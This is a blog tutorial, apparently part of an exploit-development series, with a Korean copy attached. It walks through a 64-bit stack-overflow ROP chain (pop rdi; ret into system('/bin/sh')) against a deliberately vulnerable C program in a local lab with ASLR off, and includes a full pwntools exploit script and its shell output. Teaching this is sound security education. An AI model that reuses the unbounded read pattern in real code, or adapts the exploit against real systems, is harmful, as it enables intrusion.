---
title: 'Exploit Dev Series 3 — 64-bit ROP: Calling Convention and Gadget Chaining'
date: 2026-05-28 00:00:00 +0900
categories:
- Exploit Dev
tags:
- rop
- exploit-dev
- buffer-overflow
- x86-64
- pwntools
- ret2libc
author: mmamm4
---

# Exploit Dev Series 3 — 64-bit ROP: Calling Convention and Gadget Chaining

> **Objective**: Obtain a shell by calling `system("/bin/sh")` through a ROP gadget chain on an NX-enabled 64-bit binary with ASLR disabled
>
> **Environment**: Ubuntu 22.04 (VM), gcc, pwndbg, pwntools, ROPgadget
>
> **Attack Technique**: Stack Buffer Overflow → ROP Gadget Chain → Return to Libc

---

Series 2 demonstrated ret2libc on a 32-bit binary: place the `system()` address on the stack, followed by a dummy return address and the `/bin/sh` address, and the shell spawns. Applying the same layout to a 64-bit target silently fails. The reason is architectural — the x86-64 System V ABI passes the first function argument in the **RDI register**, not on the stack. This single difference invalidates the entire 32-bit payload structure and introduces the need for ROP gadgets.

---

## Environment and Code

```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[64];
    printf("Input: ");
    read(0, buf, 256);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

`read()` accepts up to 256 bytes into a 64-byte buffer. Any input exceeding 64 bytes overflows the stack and overwrites the return address.

Compilation:

```bash
gcc -fno-stack-protector -no-pie vuln.c -o vuln
```

checksec output:

```
Arch:   amd64-64-little
RELRO:  Partial RELRO
Stack:  No canary found
NX:     NX enabled
PIE:    No PIE (0x400000)
SHSTK:  Enabled
IBT:    Enabled
```

NX is enabled, ruling out shellcode execution on the stack. The absence of a stack canary leaves the overflow undetected, and the fixed load address (no PIE) keeps binary addresses constant across runs.

---

## Offset Calculation

A cyclic pattern locates the exact return address offset.

```bash
pwndbg> r <<< $(python3 -c "from pwn import *; import sys; sys.stdout.buffer.write(cyclic(1000))")
```

Registers at crash:

```
RBP  0x6161617261616171 ('qaaaraaa')
RSP  0x7fffffffe028  →  0x6161617461616173 ('saaataaa')
RIP  0x4011ae  ◂— ret
```

```bash
pwndbg> cyclic -l $rbp
Finding cyclic pattern of 4 bytes: b'qaaa'
Found at offset 64
```

`cyclic -l $rbp` finds the position of the **saved RBP** in the cyclic input, not the return address. The return address lies 8 bytes beyond that:

```
[ buf 64B ] [ saved RBP 8B ] [ return address 8B ]
  offset 0        64                  72  ← overwrite target
```

**Offset to return address = 64 + 8 = 72.**

`cyclic -l $rsp` fails because RSP holds a stack *address* (`0x7fffffffe028`), not a cyclic pattern. To find the return address offset directly from the RSP value, pass the dereferenced value instead: `cyclic -l 0x6161617461616173` → 72.

---

## Why the Series 2 Approach Fails — 64-bit Calling Convention

The Series 2 payload:

```
[ padding ] [ system_addr ] [ dummy_ret ] [ binsh_addr ]
```

This works in 32-bit because the x86 calling convention passes arguments on the stack. `system()` reads its first argument from `ESP+4` upon entry.

The x86-64 System V ABI defines a different contract: the first six integer arguments are passed in registers — RDI, RSI, RDX, RCX, R8, R9 — in that order. When `system()` executes in 64-bit, it reads **RDI**, not the stack, as its first argument. Placing the `/bin/sh` address on the stack has no effect on the outcome.

| Architecture | First Argument Location |
|-------------|------------------------|
| x86 32-bit  | Stack (ESP+4)          |
| x86-64      | RDI register           |

A buffer overflow cannot directly overwrite CPU registers. A **ROP gadget** is therefore required to load RDI with the correct value before `system()` is invoked.

---

## ROP Gadgets

Return-Oriented Programming (ROP) reuses short instruction sequences — **gadgets** — already present in the binary or its loaded libraries. Each gadget ends with a `ret` instruction. Since `ret` pops the next value from the stack into RIP, chaining gadget addresses on the stack produces an arbitrary sequence of operations without injecting any new code.

The gadget required for this exploit is **`pop rdi; ret`**:

```
Execution flow:
1. ret      → pops [pop_rdi address] from stack into RIP
2. pop rdi  → pops [binsh_addr] from stack into RDI
3. ret      → pops [system_addr] from stack into RIP
4. system() → reads RDI = "/bin/sh" → shell
```

Payload layout:

```
[ padding 72B ] [ pop_rdi addr ] [ binsh_addr ] [ ret addr ] [ system_addr ]
```

The bare `ret` gadget before `system()` ensures RSP is 16-byte aligned at the point of entry. Without this alignment, SSE instructions inside glibc's `system()` — such as `movaps` — raise a Segfault.

---

## Finding Gadgets

Searching the binary first:

```bash
ROPgadget --binary ./vuln --only "pop|ret"
```

```
0x000000000040115d : pop rbp ; ret
0x000000000040101a : ret
```

`pop rdi; ret` is absent from the binary. The gadget must be sourced from libc. With ASLR disabled, the libc base address is fixed and the gadget offset can be computed statically:

```python
pop_rdi = libc_base + next(libc.search(asm('pop rdi; ret')))
```

When calling `asm()`, pwntools must be configured for the correct architecture. Without `context(arch='amd64')`, the assembler defaults to 32-bit mode, treats `rdi` as an undefined external symbol, and raises the following error:

```
pwnlib.exception.PwnlibException: Shellcode contains relocations: R_386_32 rdi
```

The stack alignment `ret` gadget is taken directly from the binary:

```python
ret_gadget = 0x40101a
```

---

## Collecting Addresses

Verify that ASLR is disabled:

```bash
cat /proc/sys/kernel/randomize_va_space   # 0 = disabled
```

Confirm the libc load address:

```bash
ldd ./vuln
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
```

Read the internal offsets from the libc ELF:

```python
from pwn import *
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
log.info(f"system  : {hex(libc.symbols['system'])}")
log.info(f"/bin/sh : {hex(next(libc.search(b'/bin/sh')))}")
```

| Symbol       | libc Base          | Offset (within libc) | Absolute Address   |
|--------------|--------------------|----------------------|--------------------|
| system()     | 0x7ffff7c00000     | libc.symbols['system'] | base + offset    |
| /bin/sh      | 0x7ffff7c00000     | libc.search(b'/bin/sh') | base + offset   |
| pop rdi; ret | 0x7ffff7c00000     | libc.search(gadget bytes) | base + offset |

---

## Exploit

```python
from pwn import *

context(arch='amd64', os='linux')

elf  = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

libc_base   = 0x00007ffff7c00000  # fixed base confirmed by ldd (ASLR disabled)
system_addr = libc_base + libc.symbols['system']
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi     = libc_base + next(libc.search(asm('pop rdi; ret')))
ret_gadget  = 0x40101a  # stack alignment

offset = 72  # buf[64] + saved RBP[8]

io = process('./vuln')

payload  = b'A' * offset
payload += p64(pop_rdi)     # RDI ← binsh_addr
payload += p64(binsh_addr)
payload += p64(ret_gadget)  # 16-byte stack alignment
payload += p64(system_addr)

io.sendline(payload)
io.interactive()
```

Execution result:

```bash
$ python3 exploit.py
[+] Starting local process './vuln': pid 44183
[*] Switching to interactive mode
Input: $ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
$ whoami
kali
```

---

## Closing Thoughts

The transition from 32-bit to 64-bit introduces one critical difference: function arguments move from the stack to registers. This breaks the naive ret2libc payload and requires a ROP gadget — specifically `pop rdi; ret` — to load RDI before `system()` is called. The gadget need not exist in the binary itself; libc, loaded at a known fixed address under disabled ASLR, provides it.

Five takeaways from this exercise:

1. **64-bit calling convention**: the first argument goes in RDI, not on the stack.
2. **ROP gadgets**: small code sequences already present in memory, chained via `ret` to achieve controlled register state without injecting shellcode.
3. **Offset arithmetic**: `cyclic -l $rbp` returns the saved-RBP offset; the return address lies 8 bytes further.
4. **Stack alignment**: a bare `ret` before `system()` ensures the 16-byte RSP alignment required by SSE instructions in glibc.
5. **pwntools context**: `context(arch='amd64')` must be set before calling `asm()` for 64-bit targets.

The next challenge introduces ASLR. With the libc base randomized on every run, pre-computed addresses are no longer valid. The solution is a **GOT leak** — read a live libc address from the GOT at runtime, subtract the known symbol offset to derive the current base, then complete the ret2libc chain.

---

<style>.kr-code-block{margin:1em 0;border-radius:6px;overflow-x:auto;background:#272822;}.kr-code-block>code{display:block;white-space:pre;padding:1em;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:0.85em;line-height:1.5;color:#f8f8f2;background:transparent;}</style>
<details class="kr-orig" markdown="0"><summary>🇰🇷 한국어 원문</summary><div class="kr-content">
<h2>Exploit Dev Series 3 — 64-bit ROP: 호출 규약과 가젯 체인</h2>
<blockquote>
<p><strong>목표</strong>: ASLR이 비활성화된 NX 64-bit 바이너리에서 <code>pop rdi; ret</code> 가젯을 이용해 <code>system("/bin/sh")</code> 호출로 쉘 획득</p>
<p><strong>환경</strong>: Ubuntu 22.04 (VM), gcc, pwndbg, pwntools, ROPgadget</p>
<p><strong>공격 기법</strong>: Stack Buffer Overflow → ROP 가젯 체인 → Return to Libc</p>
</blockquote>
<hr />
<p>2편에서는 32-bit <code>ret2libc</code>를 성공했습니다. 이번에는 똑같이 NX가 켜진 환경에서 <code>system("/bin/sh")</code>을 호출하는데, 아키텍처가 64-bit로 바뀌었습니다. 처음에는 2편 방식 그대로 payload를 짰다가 쉘이 뜨지 않았습니다. 이유는 단순했습니다 — <strong>64-bit는 함수 인자를 스택이 아니라 레지스터로 전달합니다.</strong></p>
<hr />
<h2>환경과 코드</h2>
<div class="kr-code-block"><code><span class="c1">// vuln.c</span><br><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><br><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><br><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><br><br><span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><br><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><br><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Input: &quot;</span><span class="p">);</span><br><span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">);</span><br><span class="p">}</span><br><br><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><br><span class="w">    </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">_IONBF</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><br><span class="w">    </span><span class="n">vuln</span><span class="p">();</span><br><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><br><span class="p">}</span><br></code></div>

<p><code>read()</code>가 <code>buf[64]</code>에 최대 256바이트를 읽습니다. 64바이트 이상 입력하면 스택을 넘쳐 return address까지 덮어쓸 수 있습니다.</p>
<p>컴파일:</p>
<div class="kr-code-block"><code>gcc<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-no-pie<span class="w"> </span>vuln.c<span class="w"> </span>-o<span class="w"> </span>vuln<br></code></div>

<p>checksec 확인:</p>
<div class="kr-code-block"><code>Arch:   amd64-64-little<br>RELRO:  Partial RELRO<br>Stack:  No canary found<br>NX:     NX enabled<br>PIE:    No PIE (0x400000)<br>SHSTK:  Enabled<br>IBT:    Enabled<br></code></div>

<p>NX가 켜져 있어 스택에 shellcode를 올려 실행할 수 없습니다. stack canary가 없으니 overflow 자체는 막히지 않습니다. PIE가 꺼져 있어 바이너리의 코드 영역 주소는 고정입니다.</p>
<hr />
<h2>오프셋 계산</h2>
<p>pwndbg에서 cyclic 패턴으로 return address까지의 오프셋을 구합니다.</p>
<div class="kr-code-block"><code>pwndbg&gt;<span class="w"> </span>r<span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="k">$(</span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;from pwn import *; import sys; sys.stdout.buffer.write(cyclic(1000))&quot;</span><span class="k">)</span><br></code></div>

<p>crash 시점 레지스터:</p>
<div class="kr-code-block"><code>RBP  0x6161617261616171 (&#39;qaaaraaa&#39;)<br>RSP  0x7fffffffe028  →  0x6161617461616173 (&#39;saaataaa&#39;)<br>RIP  0x4011ae  ◂— ret<br></code></div>

<div class="kr-code-block"><code>pwndbg&gt;<span class="w"> </span>cyclic<span class="w"> </span>-l<span class="w"> </span><span class="nv">$rbp</span><br>Finding<span class="w"> </span>cyclic<span class="w"> </span>pattern<span class="w"> </span>of<span class="w"> </span><span class="m">4</span><span class="w"> </span>bytes:<span class="w"> </span>b<span class="s1">&#39;qaaa&#39;</span><br>Found<span class="w"> </span>at<span class="w"> </span>offset<span class="w"> </span><span class="m">64</span><br></code></div>

<p><code>cyclic -l $rbp</code>는 RBP 레지스터 값에서 패턴을 찾아 <strong>saved RBP의 위치</strong>를 반환합니다. return address는 거기서 8바이트 더 뒤에 위치합니다:</p>
<div class="kr-code-block"><code>[ buf 64B ] [ saved RBP 8B ] [ return address 8B ]<br>  offset 0        64                  72  ← 덮어야 할 위치<br></code></div>

<p><strong>return address offset = 64 + 8 = 72</strong></p>
<p>처음에 offset을 64로 계산해 payload를 짰다가 system_addr이 saved RBP 자리에 들어가 실패했습니다. <code>cyclic -l $rbp</code> 결과에 반드시 8을 더해야 합니다.</p>
<p>참고: <code>cyclic -l $rsp</code>는 실패합니다. RSP는 스택 포인터 레지스터의 <strong>주소값</strong>(<code>0x7fffffffe028</code>)이고, 이 값은 cyclic 패턴이 아니기 때문입니다. RSP가 가리키는 메모리의 값으로 직접 찾으려면 <code>cyclic -l 0x6161617461616173</code> (→ 72)을 사용합니다.</p>
<hr />
<h2>왜 2편 방식이 안 되는가 — 64-bit 호출 규약</h2>
<p>2편(32-bit) payload 구조:</p>
<div class="kr-code-block"><code>[ padding ] [ system_addr ] [ dummy_ret ] [ binsh_addr ]<br></code></div>

<p>이 방식이 32-bit에서 동작하는 이유는 x86 호출 규약이 함수 인자를 <strong>스택으로 전달</strong>하기 때문입니다. <code>system()</code>은 진입 시 <code>ESP+4</code> 위치의 값을 첫 번째 인자로 읽습니다.</p>
<p>x86-64 System V ABI는 다른 규칙을 따릅니다. 첫 번째 인자는 <strong>RDI 레지스터</strong>로 전달됩니다. 64-bit에서 <code>system()</code>을 호출하면 스택이 아닌 RDI를 첫 번째 인자로 읽습니다. 스택에 <code>/bin/sh</code> 주소를 올려도 완전히 무시됩니다.</p>
<table>
<thead>
<tr>
<th>아키텍처</th>
<th>첫 번째 인자 전달 위치</th>
</tr>
</thead>
<tbody>
<tr>
<td>x86 32-bit</td>
<td>스택 (ESP+4)</td>
</tr>
<tr>
<td>x86-64</td>
<td>RDI 레지스터</td>
</tr>
</tbody>
</table>
<p>overflow로 레지스터를 직접 덮을 수는 없으므로, RDI에 원하는 값을 넣어주는 코드 조각 — <strong>ROP 가젯</strong> — 이 필요합니다.</p>
<hr />
<h2>ROP 가젯이란</h2>
<p>ROP(Return-Oriented Programming)는 바이너리나 라이브러리에 이미 존재하는 코드 조각(<strong>가젯</strong>)들을 <code>ret</code> 명령어로 연결해 원하는 동작을 만드는 기법입니다.</p>
<p>가젯은 <code>명령어; ret</code> 형태입니다. <code>ret</code>을 만나면 스택에서 다음 주소를 꺼내 RIP에 넣으므로, 스택에 가젯 주소들을 순서대로 나열하면 새 코드를 주입하지 않고도 연속 실행이 가능합니다.</p>
<p>이번에 필요한 가젯: <strong><code>pop rdi; ret</code></strong></p>
<div class="kr-code-block"><code>실행 흐름:<br>1. ret      → 스택에서 [pop_rdi 주소]를 꺼내 RIP에 넣음<br>2. pop rdi  → 스택에서 [binsh_addr]를 꺼내 RDI에 넣음<br>3. ret      → 스택에서 [system_addr]를 꺼내 RIP에 넣음<br>4. system() → RDI = &quot;/bin/sh&quot; → 쉘<br></code></div>

<p>payload 구조:</p>
<div class="kr-code-block"><code>[ padding 72B ] [ pop_rdi 주소 ] [ binsh_addr ] [ ret 주소 ] [ system_addr ]<br></code></div>

<p><code>system()</code> 앞에 넣는 bare <code>ret</code> 가젯은 스택 16바이트 정렬을 맞추기 위한 것입니다. 정렬이 맞지 않으면 glibc 내부의 <code>movaps</code> 같은 SSE 명령어가 Segfault를 발생시킵니다.</p>
<hr />
<h2>가젯 찾기</h2>
<p>먼저 바이너리에서 탐색합니다:</p>
<div class="kr-code-block"><code>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>./vuln<span class="w"> </span>--only<span class="w"> </span><span class="s2">&quot;pop|ret&quot;</span><br></code></div>

<div class="kr-code-block"><code>0x000000000040115d : pop rbp ; ret<br>0x000000000040101a : ret<br></code></div>

<p><code>pop rdi; ret</code>이 바이너리에 없습니다. libc에서 가져와야 합니다. ASLR이 비활성화된 환경이므로 libc 베이스가 고정되어 있어 가젯 주소를 정적으로 계산할 수 있습니다:</p>
<div class="kr-code-block"><code><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rdi; ret&#39;</span><span class="p">)))</span><br></code></div>

<p><code>asm()</code> 사용 시 <strong>반드시 <code>context(arch='amd64')</code>를 먼저 설정해야 합니다.</strong> 설정하지 않으면 pwntools가 32-bit 모드로 어셈블해 <code>rdi</code>를 알 수 없는 외부 심볼로 취급하고 아래 에러를 냅니다:</p>
<div class="kr-code-block"><code>pwnlib.exception.PwnlibException: Shellcode contains relocations: R_386_32 rdi<br></code></div>

<p>스택 정렬용 <code>ret</code> 가젯은 바이너리에서 가져옵니다:</p>
<div class="kr-code-block"><code><span class="n">ret_gadget</span> <span class="o">=</span> <span class="mh">0x40101a</span><br></code></div>

<hr />
<h2>주소 수집</h2>
<p>ASLR 비활성화 확인:</p>
<div class="kr-code-block"><code>cat<span class="w"> </span>/proc/sys/kernel/randomize_va_space<span class="w">   </span><span class="c1"># 0 이면 비활성화</span><br></code></div>

<p>libc 베이스 주소 확인:</p>
<div class="kr-code-block"><code>ldd<span class="w"> </span>./vuln<br><span class="c1">## libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)</span><br></code></div>

<p>libc 내부 오프셋 확인:</p>
<div class="kr-code-block"><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span><br><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span><br><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;system  : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span><br><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;/bin/sh : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)))</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span><br></code></div>

<table>
<thead>
<tr>
<th>심볼</th>
<th>libc 베이스</th>
<th>오프셋</th>
<th>절대 주소</th>
</tr>
</thead>
<tbody>
<tr>
<td>system()</td>
<td>0x7ffff7c00000</td>
<td>libc 내부 오프셋</td>
<td>베이스 + 오프셋</td>
</tr>
<tr>
<td>/bin/sh</td>
<td>0x7ffff7c00000</td>
<td>libc 내부 오프셋</td>
<td>베이스 + 오프셋</td>
</tr>
<tr>
<td>pop rdi; ret</td>
<td>0x7ffff7c00000</td>
<td>libc 내부 오프셋</td>
<td>베이스 + 오프셋</td>
</tr>
</tbody>
</table>
<hr />
<h2>Exploit</h2>
<div class="kr-code-block"><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span><br><br><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span><br><br><span class="n">elf</span>  <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span><br><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span><br><br><span class="n">libc_base</span>   <span class="o">=</span> <span class="mh">0x00007ffff7c00000</span>  <span class="c1"># ldd로 확인한 고정 베이스 (ASLR 비활성화)</span><br><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span><br><span class="n">binsh_addr</span>  <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span><br><span class="n">pop_rdi</span>     <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rdi; ret&#39;</span><span class="p">)))</span><br><span class="n">ret_gadget</span>  <span class="o">=</span> <span class="mh">0x40101a</span>  <span class="c1"># 스택 16바이트 정렬용</span><br><br><span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>  <span class="c1"># buf[64] + saved RBP[8]</span><br><br><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span><br><br><span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><br><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>     <span class="c1"># RDI ← binsh_addr</span><br><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span><br><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_gadget</span><span class="p">)</span>  <span class="c1"># 스택 정렬</span><br><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><br><br><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><br><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span><br></code></div>

<p>실행 결과:</p>
<div class="kr-code-block"><code>$<span class="w"> </span>python3<span class="w"> </span>exploit.py<br><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span><span class="nb">local</span><span class="w"> </span>process<span class="w"> </span><span class="s1">&#39;./vuln&#39;</span>:<span class="w"> </span>pid<span class="w"> </span><span class="m">44183</span><br><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Switching<span class="w"> </span>to<span class="w"> </span>interactive<span class="w"> </span>mode<br>Input:<span class="w"> </span>$<span class="w"> </span>id<br><span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>kali<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>kali<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>kali<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,122<span class="o">(</span>lpadmin<span class="o">)</span>,135<span class="o">(</span>lxd<span class="o">)</span>,136<span class="o">(</span>sambashare<span class="o">)</span><br>$<span class="w"> </span>whoami<br>kali<br></code></div>

<hr />
<h2>돌아보며</h2>
<p>32-bit에서 64-bit로 아키텍처가 바뀌면서 결정적인 차이가 하나 생겼습니다. 함수 인자가 스택에서 레지스터로 이동한 것입니다. 이 변화 하나가 기존 ret2libc payload를 완전히 무력화시키고, <code>pop rdi; ret</code> 가젯이라는 새로운 요소를 요구합니다. 가젯은 바이너리에 없어도 됩니다 — ASLR이 꺼진 환경에서 libc는 고정된 주소에 적재되므로 libc 안의 가젯을 그대로 활용할 수 있습니다.</p>
<p>이번 실습에서 배운 핵심:</p>
<ol>
<li><strong>64-bit 호출 규약</strong>: 첫 번째 인자는 RDI 레지스터로 전달됩니다. 스택에 올린다고 인자가 되지 않습니다.</li>
<li><strong>ROP 가젯</strong>: 이미 메모리에 존재하는 코드 조각을 <code>ret</code>으로 연결해, 새 코드를 주입하지 않고 레지스터 상태를 제어합니다.</li>
<li><strong>오프셋 계산</strong>: <code>cyclic -l $rbp</code>는 saved RBP 위치를 반환합니다. return address는 거기서 8바이트 더 뒤입니다.</li>
<li><strong>스택 정렬</strong>: <code>system()</code> 진입 전 RSP가 16바이트 정렬이어야 합니다. 맞지 않으면 SSE 명령어에서 Segfault가 발생합니다.</li>
<li><strong>pwntools context</strong>: <code>context(arch='amd64')</code>를 설정하지 않으면 <code>asm()</code>이 32-bit 모드로 동작해 에러가 납니다.</li>
</ol>
<p>다음은 ASLR이 켜진 환경입니다. libc 베이스가 매 실행마다 바뀌므로 하드코딩된 주소는 쓸 수 없습니다. 런타임에 GOT에서 실제 libc 주소를 읽어 베이스를 역산한 뒤 exploit을 완성하는 <strong>GOT 릭</strong> 기법으로 넘어갑니다.</p>
</div></details>

